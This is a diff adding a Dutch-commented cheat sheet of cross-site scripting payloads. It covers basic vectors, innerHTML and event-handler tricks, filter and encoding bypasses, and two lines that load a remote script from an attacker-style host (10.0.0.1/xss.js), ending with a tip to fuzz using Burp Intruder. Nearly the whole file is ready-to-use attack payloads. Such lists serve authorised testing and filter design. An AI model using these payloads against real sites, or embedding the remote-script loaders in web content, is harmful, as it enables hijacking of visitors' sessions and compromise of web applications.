@@ -1,0 +1,32 @@
+# XSS Payloads - Veelgebruikte vectoren en filter bypasses
+# === Basis ===
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+# === innerHTML bypass (script tags werken niet via innerHTML) ===
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+# === Event handlers ===
+<div onmouseover="alert(1)">hover me</div>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+# === Tag/keyword bypass ===
+<ScRiPt>alert(1)</sCrIpT>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror=alert`1`>
+# === Encoding bypass ===
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+javascript:alert(1)
+# === Without parentheses ===
+<img src=x onerror=alert`1`>
+<img src=x onerror="window.onerror=alert;throw 1">
+# === Extern script laden ===
+<script src="http://10.0.0.1/xss.js"></script>
+<img src=x onerror="s=document.createElement('script');s.src='http://10.0.0.1/xss.js';document.body.appendChild(s)">
+# === DOM-based (sink: document.write, innerHTML, eval) ===
+# Test: Zet # of ? parameter met payload en check of het in DOM terechtkomt
+# Tip: Gebruik Burp Intruder met XSS polyglot wordlist voor fuzzing
